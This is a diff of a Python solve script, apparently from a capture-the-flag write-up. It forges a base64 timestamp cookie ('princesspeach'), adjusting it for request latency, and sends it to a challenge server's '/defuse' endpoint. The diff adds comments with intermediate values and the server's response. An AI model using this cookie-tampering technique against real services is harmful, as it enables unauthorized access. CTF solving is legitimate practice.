@@ -18,7 +18,6 @@ import requests
 import base64
 
 s = requests.Session()
-print(s.cookies.get_dict())
 
 res = s.get('http://13.213.72.54:5003/')
 
@@ -26,25 +25,36 @@ res = s.get('http://13.213.72.54:5003/')
 time_elapsed = res.elapsed
 time_elapsed = time_elapsed.total_seconds()
 print(res.elapsed)
+# 0:00:00.019976
 
 
 time_to_decode = s.cookies.get_dict()['princesspeach']
 decoded_datetime = base64.b64decode(time_to_decode).decode('utf-8')
+# '2022-05-01 12:41:35.329922'
 decoded_time = decoded_datetime.split('.')
+# ['2022-05-01 12:41:35', '308641']
 decoded_microseconds = decoded_datetime.split('.')[1]
+# '329922'
 decoded_microseconds_in_seconds = int(decoded_microseconds)/1000000
+# 0.329922
 
 new_time = decoded_microseconds_in_seconds - time_elapsed
 new_time_in_microseconds = int(new_time * 1000000)
+# 308641
 
 decoded_time[1] = str(new_time_in_microseconds)
 
 to_encode = ''.join(decoded_time)
+# '2022-05-01 12:41:35308641'
 encoded_time = base64.b64encode(bytes(to_encode, 'utf-8'))
+# b'MjAyMi0wNS0wMSAxMjo0MTozNTMwODY0MQ=='
 
 s.cookies['princesspeach'] = encoded_time
 res = s.get('http://13.213.72.54:5003/defuse')
 print(res.content)
+
+""" >>> print(res.content)
+b'<!DOCTYPE html>\n<html>\n<head>\n <title></title>\n <meta charset="utf-8" />\n</head><body>\n<div class="bd-example" align="middle">\n\n<img src="/static/712a8b4446afb5d43da0dea63cd1c13b.jpg"align="middle" />\n\n</div>\n</body>\n</html>' """
 ```
 
 ## Write farewell letters
